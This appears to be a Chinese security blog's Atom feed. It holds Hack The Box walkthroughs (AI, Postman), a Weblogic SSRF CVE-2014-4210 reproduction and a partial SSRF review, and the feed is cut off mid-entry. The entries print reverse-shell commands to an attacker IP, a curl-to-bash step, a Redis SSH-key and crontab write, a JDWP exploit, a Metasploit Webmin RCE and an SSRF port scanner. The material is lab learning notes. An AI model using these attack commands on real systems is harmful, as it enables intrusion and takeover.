<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>be a J0K1R</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-02-02T09:09:23.099Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Peguin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>csrfreview</title>
    <link href="http://yoursite.com/2021/02/02/csrfreview/"/>
    <id>http://yoursite.com/2021/02/02/csrfreview/</id>
    <published>2021-02-02T09:09:23.000Z</published>
    <updated>2021-02-02T09:09:23.099Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ai-hackthebox</title>
    <link href="http://yoursite.com/2021/02/01/ai-hackthebox/"/>
    <id>http://yoursite.com/2021/02/01/ai-hackthebox/</id>
    <published>2021-02-01T10:04:42.000Z</published>
    <updated>2021-02-01T17:36:40.792Z</updated>
    
    <content type="html"><![CDATA[<img src="/2021/02/01/ai-hackthebox/17.png" class=""><p>AI靶机，参考大神视频<code>https://www.youtube.com/watch?v=7n7YRntu3bc&amp;t=1391s</code>，有了上次的底子这次就整个流程熟悉了很多，记录一下<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.6</span><br><span class="line">靶机：10.10.10.163</span><br></pre></td></tr></table></figure><h3 id="nmap探测端口"><a href="#nmap探测端口" class="headerlink" title="nmap探测端口"></a>nmap探测端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/ai 10.10.10.163</span><br></pre></td></tr></table></figure><img src="/2021/02/01/ai-hackthebox/1.png" class=""><p>就两个开放端口，22和80，有<code>http</code>服务，可以直接访问一下靶机地址</p><img src="/2021/02/01/ai-hackthebox/2.png" class=""><p>可以看到有几个页面跳转，地址栏可以看到是<code>php</code>的，<code>ai.php</code>页面可以上传wav文件</p><p><code>nmap</code>扫瞄一下全部端口号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -oA nmap/ai-allports 10.10.10.163</span><br></pre></td></tr></table></figure><img src="/2021/02/01/ai-hackthebox/3.png" class=""><p>到这里只知道开启了http服务，并且是php的server，下面就是上gobuster进行目录爆破</p><h3 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o gobuster-airoot.log</span><br><span class="line">由于知道是php的服务，这里加上-x php</span><br></pre></td></tr></table></figure><p>在等待的过程中可以尝试在<code>ai.php</code>界面上传文件，尝试上传<code>php</code>的<code>webshell</code></p><img src="/2021/02/01/ai-hackthebox/4.png" class=""><p>根据回显猜测应该是存在一个<code>sql</code>注入，而且可能文件格式为<code>wav</code></p><img src="/2021/02/01/ai-hackthebox/5.png" class=""><p>新发现了两个路径，加上存在<code>db.php</code>，应该会是<code>sql</code>注入</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><code>http://10.10.10.163/intelligence.php</code></p><img src="/2021/02/01/ai-hackthebox/6.png" class=""><p>给了一些提示，要用到的注入<code>union、-- -</code>的替代</p><p>由于要上传<code>wav</code>文件，<code>google linux say command</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://askubuntu.com/questions/501910/how-to-text-to-speech-output-using-command-line</span></span><br></pre></td></tr></table></figure><p>下载安装festival，里面有一个<code>text2wave</code>模块可以转化成<code>wav</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;hello&#39; | text2wave -o test.wav</span><br></pre></td></tr></table></figure><img src="/2021/02/01/ai-hackthebox/7.png" class=""><p>这里比较坑的点是得用英文，猜测表名应该为users</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo "open single quote, join, select, username from users comment database" | text2wave -o test.wav</span><br><span class="line"></span><br><span class="line">echo "open single quote, join, select, password from users comment database" | text2wave -o test.wav</span><br></pre></td></tr></table></figure><img src="/2021/02/01/ai-hackthebox/8.png" class=""><img src="/2021/02/01/ai-hackthebox/9.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alexa:H,Sq9t6&#125;a&lt;)?q93_</span><br></pre></td></tr></table></figure><p>拿到了用户和密码，想到开放了22端口，尝试ssh连接</p><h3 id="ssh连接，数据库查询"><a href="#ssh连接，数据库查询" class="headerlink" title="ssh连接，数据库查询"></a>ssh连接，数据库查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh alexa@10.10.10.163</span><br></pre></td></tr></table></figure><p>当前目录下就有user.txt，用户权限到手</p><p>到web目录下看一下，<code>db.php</code>爆出了数据库名和密码</p><img src="/2021/02/01/ai-hackthebox/10.png" class=""><p>尝试连接数据库，查一下刚才的<code>users</code>表</p><p>可以看到root对应的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:H,Sq9t6&#125;a&lt;)?q931</span><br></pre></td></tr></table></figure><p>但是没有办法ssh连接，换个思路，上<code>linpeas.sh</code>分析可能存在的提权漏洞点</p><h3 id="linpeas分析"><a href="#linpeas分析" class="headerlink" title="linpeas分析"></a>linpeas分析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>用python起一个web服务</p><p>然后在靶机上curl直接运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.14.6:8000/linpeas.sh | bash</span><br></pre></td></tr></table></figure><img src="/2021/02/01/ai-hackthebox/11.png" class=""><p>可以看到标红的<code>jdwp</code>，这可能就是漏洞点，google一下这是什么东西</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息</span><br></pre></td></tr></table></figure><h3 id="端口转发本地"><a href="#端口转发本地" class="headerlink" title="端口转发本地"></a>端口转发本地</h3><p>这里跟着大神学到了端口转发到本地</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8009:127.0.0.1:8009 -L 8080:127.0.0.1:8080  alexa@10.10.10.163</span><br></pre></td></tr></table></figure><p>在这之前先用<code>ss -ntlp</code>来查看本地端口占用情况，转发之后再查看一次</p><img src="/2021/02/01/ai-hackthebox/12.png" class=""><p>访问<code>127.0.0.1:8080</code>，尝试管理服务，需要账号密码，查找tomcat所在路径，配置文件没有权限访问</p><img src="/2021/02/01/ai-hackthebox/13.png" class=""><p>服务器上还有一个8000端口，应该是<code>jdwp</code>的，也转发出来，tomcat路径下<code>~C</code>进入ssh，转发出来</p><img src="/2021/02/01/ai-hackthebox/14.png" class=""><h3 id="反弹jdwpshell"><a href="#反弹jdwpshell" class="headerlink" title="反弹jdwpshell"></a>反弹jdwpshell</h3><p>先在靶机的<code>tmp</code>目录下创建<code>test.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -c <span class="string">'bash -i &gt;&amp; /dev/tcp/10.10.14.6/9002 0&gt;&amp;1'</span></span><br><span class="line"></span><br><span class="line">更改权限chmod +x test.sh</span><br></pre></td></tr></table></figure><p>先尝试本地监听，弹回了shell</p><img src="/2021/02/01/ai-hackthebox/15.png" class=""><p><code>google jdwp</code>的命令执行漏洞，可以在Github上找到工具，知道创宇有一篇文章讲解的很详细</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;IOActive&#x2F;jdwp-shellifier</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;933&#x2F;#shell</span><br></pre></td></tr></table></figure><p> shellifier用法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 目标主机ip -p jdwp运行端口 --cmd "Your Command"</span><br></pre></td></tr></table></figure><p>由于已经转发了<code>ip，端口</code>，所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 127.0.0.1 --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span> --cmd <span class="string">"/tmp/test.sh"</span></span><br></pre></td></tr></table></figure><p>下面就利用<code>shelliier</code>反弹<code>jdwp</code>的shell，成功弹回root的shell，并且root.txt就在当前目录下</p><img src="/2021/02/01/ai-hackthebox/16.png" class=""><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>历时4个小时，在大神视频的帮助以及<code>byc_404</code>师傅文章的帮助下拿下了root权限，提权不够熟悉，前面信息收集的一套流程以及提权点发现熟悉了许多。</p>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;/2021/02/01/ai-hackthebox/17.png&quot; class=&quot;&quot;&gt;

&lt;p&gt;AI靶机，参考大神视频&lt;code&gt;https://www.youtube.com/watch?v=7n7YRntu3bc&amp;amp;t=1391s&lt;/code&gt;，有了上次的底子这次就整个流程熟悉了很多，记录一下
    
    </summary>
    
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>postman-hackthebox</title>
    <link href="http://yoursite.com/2021/01/31/postman-hackthebox/"/>
    <id>http://yoursite.com/2021/01/31/postman-hackthebox/</id>
    <published>2021-01-31T08:00:36.000Z</published>
    <updated>2021-02-01T10:10:02.866Z</updated>
    
    <content type="html"><![CDATA[<p>1hackthebox第一台机子，边做边记录，充了vip，跟着youtube的大神IppSec视频来做，纯英文听起来有点困难（实操时nmap扫描需要等待，为看起来方便结果都会放在对应命令下面）<a id="more"></a></p><img src="/2021/01/31/postman-hackthebox/20.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.16</span><br><span class="line">靶机：10.10.10.160</span><br></pre></td></tr></table></figure><h3 id="nmap信息收集"><a href="#nmap信息收集" class="headerlink" title="nmap信息收集"></a>nmap信息收集</h3><p>探测端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/postman 10.10.10.160</span><br></pre></td></tr></table></figure><img src="/2021/01/31/postman-hackthebox/1.png" class=""><p>爆破端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -oA nmap/postman-allports 10.10.10.160</span><br></pre></td></tr></table></figure><img src="/2021/01/31/postman-hackthebox/7.png" class=""><p>可以看到有个<code>6379</code>，redis服务</p><p>接着访问一下靶机地址</p><img src="/2021/01/31/postman-hackthebox/2.png" class=""><p>没有什么有用的信息，记一下邮箱地址<code>Postman@htb</code>,burp抓个包</p><img src="/2021/01/31/postman-hackthebox/3.png" class=""><p>加载的都是一些静态文件，没有什么东西，<code>gobuster</code>尝试目录爆破</p><h3 id="gobuster爆破目录"><a href="#gobuster爆破目录" class="headerlink" title="gobuster爆破目录"></a>gobuster爆破目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.160 -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt -o gobuster-root.log</span><br></pre></td></tr></table></figure><img src="/2021/01/31/postman-hackthebox/6.png" class=""><p>等待的时候回过头来看<code>less nmap/postman.nmap</code></p><p>可以看到有一个10000端口，有个<code>MiniServ</code>,用<code>searchsploit</code>查找一下</p><img src="/2021/01/31/postman-hackthebox/4.png" class=""><p>没有东西，尝试访问<code>10.10.10.160:10000,</code>网站带SSL，用的是https协议，<code>vi /etc/hosts</code>,加上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.160 postman</span><br></pre></td></tr></table></figure><p>再次尝试访问</p><img src="/2021/01/31/postman-hackthebox/5.png" class=""><p>需要账号密码，暂时放一下，看一下<code>gobuster</code>目录爆破的结果，有一些静态文件的路径</p><p>访问<code>10.10.10.160/upload</code>可以看到很多静态图片，<code>wget</code>下载<code>Cyber-security-web-banner.jpg</code>,用<code>exiftool</code>查看详细信息</p><img src="/2021/01/31/postman-hackthebox/8.png" class=""><p>同样可以下载<code>10.10.10.160/index.html</code>来查看，步骤同上</p><p>回过头来看redis</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v 10.10.10.160 6379</span><br></pre></td></tr></table></figure><p><code>https://redis.io/commands/info</code>看一下可以看redis配置信息的命令，这里直接用<code>INFO</code></p><img src="/2021/01/31/postman-hackthebox/9.png" class=""><h3 id="redis-ssh-crack"><a href="#redis-ssh-crack" class="headerlink" title="redis ssh crack"></a>redis ssh crack</h3><p>接着找一下<code>redis upload webshell</code>，<code>https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</code>,文章里有各种攻击方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script redis-info -sV -p 6379 10.10.10.160</span><br></pre></td></tr></table></figure><img src="/2021/01/31/postman-hackthebox/10.png" class=""><p>这台靶机主要是利用ssh，先生成ssh密钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f postman</span><br></pre></td></tr></table></figure><p>之后就是按照文章给的来(这里google找到redis能够写入文件的路径)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat postman.pub | redis-cli -h 10.10.10.160 -x set crackit </span><br><span class="line"></span><br><span class="line">config set dir /var/lib/redis/</span><br><span class="line">config set dbfilename "authorized_keys"</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">这里ssh之前记得更改密码文件的权限，chmod 600 xxx</span><br><span class="line"></span><br><span class="line">ssh -i postman redis@10.10.10.160</span><br></pre></td></tr></table></figure><img src="/2021/01/31/postman-hackthebox/11.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进去之后用linpeas脚本一键收集linux的所有信息（类似的还有LinEnum）</span><br></pre></td></tr></table></figure><p>github拉取，用python起一个环境，redis服务器上wget获取脚本,内容很多就不贴图了，主要熟悉一下收集信息的手段</p><p>下面的是最重要的信息，可以确定Matt修改了这个/opt/id_rsa文件</p><img src="/2021/01/31/postman-hackthebox/13.png" class=""><img src="/2021/01/31/postman-hackthebox/12.png" class=""><img src="/2021/01/31/postman-hackthebox/14.png" class=""><h3 id="john-crack"><a href="#john-crack" class="headerlink" title="john crack"></a>john crack</h3><p>到这里基本就找到了最后的利用点，这个rsa进行了加密，要用<code>john</code>破解</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py postman.ssh &gt; postman-join.ssh</span><br><span class="line">john postman-join.ssh --wordlist=/usr/share/wordlists/rockyou.txt  </span><br><span class="line"></span><br><span class="line">Matt:computer2008</span><br></pre></td></tr></table></figure><img src="/2021/01/31/postman-hackthebox/15.png" class=""><h3 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su Matt可以切换用户，不能用私钥直接登录，原因如下图</span><br></pre></td></tr></table></figure><img src="/2021/01/31/postman-hackthebox/17.png" class=""><p>读取user flag</p><img src="/2021/01/31/postman-hackthebox/16.png" class=""><p>回到之前<code>10000</code>端口的 登录界面，用上面的账号登录</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>1.910版本的Webmin，存在已知的漏洞。msf模块中有，需要设置ssl为true</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Webmin 1.910</span><br><span class="line"></span><br><span class="line">msfdb run</span><br><span class="line">search webmin</span><br><span class="line">use exploit/linux/http/webmin_packageup_rce</span><br><span class="line">set RHOSTS 10.10.10.160</span><br><span class="line">set LHOST tun0</span><br><span class="line">set USERNAME Matt</span><br><span class="line">set PASSWORD computer2008</span><br><span class="line">set SSL true(一定要设置为true)</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2021/01/31/postman-hackthebox/18.png" class=""><p>弹回的就是root权限的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure><img src="/2021/01/31/postman-hackthebox/19.png" class=""><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>第一台靶机到这里就结束了，怼了将近4个多小时，从头到尾跟着youtube大神过了一遍思路，还有一种不用msfconsole来反弹shell 的方式，之后再记一下</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1hackthebox第一台机子，边做边记录，充了vip，跟着youtube的大神IppSec视频来做，纯英文听起来有点困难（实操时nmap扫描需要等待，为看起来方便结果都会放在对应命令下面）
    
    </summary>
    
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic-SSRF-CVE-2014-4210</title>
    <link href="http://yoursite.com/2021/01/29/Weblogic-SSRF-CVE-2014-4210/"/>
    <id>http://yoursite.com/2021/01/29/Weblogic-SSRF-CVE-2014-4210/</id>
    <published>2021-01-29T12:56:42.000Z</published>
    <updated>2021-01-30T08:38:23.286Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Weblogic-SSRF复现"><a href="#Weblogic-SSRF复现" class="headerlink" title="Weblogic-SSRF复现"></a>Weblogic-SSRF复现<a id="more"></a></h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Oracle Fusion Middleware 10.0.2.0和10.3.6.0中Oracle WebLogic Server组件中的未指定漏洞使远程攻击者可以通过与WLS-Web Services相关的媒介来影响机密性。</p><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">centos一台</span><br><span class="line">docker-compose up -d</span><br><span class="line">#用的是p神提供的环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;weblogic&#x2F;ssrf，镜像拉取大，大概需要一个半小时左右的样子</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>起完环境之后，访问<code>http://ip:port/uddiexplorer</code>,不需要登录就能够查看uddiexplorer应用</p><p>漏洞点在<code>http://ip:port/uddiexplorer/SearchPublicRegistries.jsp</code>页面</p><p>burp抓包进行测试，漏洞点是operator参数，这里抓包可以发现传过去的参数是url地址</p><p>通过response的区别可以判断端口是否开放且能够被访问，不存在的端口会返回<code>could not connect over HTTP to server</code></p><img src="/2021/01/29/Weblogic-SSRF-CVE-2014-4210/1.png" class=""><p>如果访问的非http协议，则会返回<code>did not have a valid SOAP content-type</code>，22端口基于SSH协议</p><img src="/2021/01/29/Weblogic-SSRF-CVE-2014-4210/2.png" class=""><p>可访问的端口会返回<code>Received a response from url</code></p><img src="/2021/01/29/Weblogic-SSRF-CVE-2014-4210/3.png" class=""><p>下面进行端口探测</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ite_ip</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        final_ip = <span class="string">'&#123;ip&#125;.&#123;i&#125;.0.&#123;j&#125;'</span>.format(ip=ip, i=i,j=j)</span><br><span class="line">        <span class="keyword">print</span> final_ip</span><br><span class="line">        thread.start_new_thread(scan, (final_ip,))</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(final_ip)</span>:</span></span><br><span class="line">    ports = (<span class="string">'21'</span>, <span class="string">'22'</span>, <span class="string">'23'</span>, <span class="string">'53'</span>, <span class="string">'80'</span>, <span class="string">'135'</span>, <span class="string">'139'</span>, <span class="string">'443'</span>, <span class="string">'445'</span>, <span class="string">'1080'</span>, <span class="string">'1433'</span>, <span class="string">'1521'</span>, <span class="string">'3306'</span>, <span class="string">'3389'</span>, <span class="string">'4899'</span>, <span class="string">'8080'</span>, <span class="string">'7001'</span>, <span class="string">'8000'</span>,<span class="string">'6389'</span>,<span class="string">'6379'</span>)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        vul_url = <span class="string">'http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span> % (final_ip,port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print vul_url</span></span><br><span class="line">            r = requests.get(vul_url, timeout=<span class="number">15</span>, verify=<span class="literal">False</span>)</span><br><span class="line">            result1 = re.findall(<span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span>,r.content)</span><br><span class="line">            result2 = re.findall(<span class="string">'but could not connect'</span>, r.content)</span><br><span class="line">            result3 = re.findall(<span class="string">'No route to host'</span>, r.content)  </span><br><span class="line">            <span class="keyword">if</span> len(result1) != <span class="number">0</span> <span class="keyword">and</span> len(result2) == <span class="number">0</span> <span class="keyword">and</span> len(result3) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[!]'</span>+final_ip + <span class="string">':'</span> + port</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ip = <span class="string">"172"</span>  </span><br><span class="line">    <span class="keyword">if</span> ip:</span><br><span class="line">        <span class="keyword">print</span> ip</span><br><span class="line">        ite_ip(ip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"no ip"</span></span><br></pre></td></tr></table></figure><p>这里本地复现时没有扫到redis的开放ip地址和端口，仅做个利用redis反弹shell的笔记</p><p>shell脚本写入/etc/crontab中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 "\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n\n\n\n"</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>换行符是”\r\n”，也就是”%0D%0A”</p><p>url编码中的字符串传给<code>operator</code>参数，发送，本地服务器监听端口就能够弹回shell了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Weblogic-SSRF复现&quot;&gt;&lt;a href=&quot;#Weblogic-SSRF复现&quot; class=&quot;headerlink&quot; title=&quot;Weblogic-SSRF复现&quot;&gt;&lt;/a&gt;Weblogic-SSRF复现
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>ssrfreview</title>
    <link href="http://yoursite.com/2021/01/28/ssrfreview/"/>
    <id>http://yoursite.com/2021/01/28/ssrfreview/</id>
    <published>2021-01-28T07:14:04.000Z</published>
    <updated>2021-01-28T16:27:23.220Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ssrf知识回顾"><a href="#ssrf知识回顾" class="headerlink" title="ssrf知识回顾"></a>ssrf知识回顾<a id="more"></a></h2><h3 id="ssrf的定义"><a href="#ssrf的定义" class="headerlink" title="ssrf的定义"></a>ssrf的定义</h3><p>SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p><h3 id="ssrf的成因"><a href="#ssrf的成因" class="headerlink" title="ssrf的成因"></a>ssrf的成因</h3><p>SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>例如,黑客操作服务端从指定URL地址获取网页文本内容,加载指定地址的图片等,利用的是服务端的请求伪造,SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p><p>除了<code>http/https</code>等方式可以造成ssrf，类似<code>tcp connect</code>方式也可以探测内网一些<code>ip</code>的端口是否开发服务。</p><h3 id="ssrf可能出现的场景"><a href="#ssrf可能出现的场景" class="headerlink" title="ssrf可能出现的场景"></a>ssrf可能出现的场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</span><br><span class="line">- 从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</span><br><span class="line">- 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</span><br><span class="line">- Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</span><br><span class="line">- 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</span><br></pre></td></tr></table></figure><h3 id="ssrf利用方式"><a href="#ssrf利用方式" class="headerlink" title="ssrf利用方式"></a>ssrf利用方式</h3><ul><li><pre><code>1.可以外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；2.攻击运行在内网或本地的有漏洞程序（比如溢出）；3.可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；4.攻击内网或外网有漏洞的Web应用；5.使用file：///协议读取本地文件(或其他协议<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 